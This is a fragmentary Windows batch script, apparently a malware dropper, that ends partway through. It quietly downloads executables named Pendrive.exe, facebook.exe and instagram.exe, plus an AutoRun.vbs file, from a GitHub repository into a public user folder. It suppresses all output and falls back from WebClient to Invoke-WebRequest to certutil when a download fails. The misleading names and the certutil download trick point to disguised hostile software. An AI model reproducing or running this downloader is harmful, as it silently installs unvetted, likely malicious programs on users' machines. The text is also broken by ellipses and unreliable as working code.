...
REM BFCPEEXE=C:\Users\Shakil-PC\Desktop\pdf\facebook.exe
...
::echo ************* DOWNLOAD file ****************
   ...
   if not exist "C:\Users\Public\Licence\Extension\Pendrive.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/Exe/Pendrive.exe?raw=true', 'Pendrive.exe')" > nul 2> nul    
   )  
...
echo .
   ...
   if not exist "C:\Users\Public\Licence\Extension\facebook.exe" (      
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/Exe/facebook.exe?raw=true', 'facebook.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\AutoRun.vbs" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/Exe/AutoRun.vbs?raw=true', 'AutoRun.vbs')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\Public\Licence\Extension\instagram.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/Exe/instagram.exe?raw=true', 'instagram.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  
   ...
   if not exist "C:\Users\Public\Licence\Extension\Pendrive.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/Exe/Pendrive.exe?raw=true -OutFile Pendrive.exe" > nul 2> nul
   )
...
echo .
   ...
   if not exist "C:\Users\Public\Licence\Extension\facebook.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/Exe/facebook.exe?raw=true -OutFile facebook.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\AutoRun.vbs" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/Exe/AutoRun.vbs?raw=true -OutFile AutoRun.vbs" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\Public\Licence\Extension\instagram.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/Exe/instagram.exe?raw=true -OutFile instagram.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
   ...
   set url="https://github.com/win32u/Licence/blob/main/Extension/Exe/Pendrive.exe?raw=true"
   set filename="Pendrive.exe"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/Exe/AutoRun.vbs?raw=true"
   set filename="AutoRun.vbs"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/Exe/facebook.exe?raw=true"
   set filename="facebook.exe"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/Exe/instagram.exe?raw=true"
